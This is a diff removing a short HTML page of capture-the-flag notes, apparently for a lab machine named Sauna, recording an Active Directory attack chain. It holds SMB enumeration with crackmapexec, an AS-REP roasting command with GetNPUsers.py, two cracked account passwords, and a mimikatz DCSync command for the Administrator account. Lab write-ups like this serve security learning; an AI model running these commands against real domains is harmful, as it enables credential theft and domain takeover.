@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>enumeration</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>enumeration</h1><br/>SquidsDnsTool retuned nothing of interest<br /><br />crackmapexec smb 10.10.10.175<br />SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICALBANK) (signing:True) (SMBv1:False)<br />^^added domain to /etc/hosts<br /><br />getArch.py got me the system architecture (x64)<br /><br />6 names found at about.html<br />1 more name found while enumeration ldap<br /><br />GetNPUsers.py egotistical-bank.local/ -usersfile names.txt  -dc-ip 10.10.10.175 -format hashcat -request<br /><br />fsmith<br />Thestrokes23<br /><br />users<br />administrator, hsmith, fsmith, svc_loanmgr<br /><br />svc_loanmgr<br />Moneymakestheworldgoround!<br /><br /><br /><br />./mimikatz.exe “lsadump::dcsync /user:Administrator” “exit”</div></body></html>
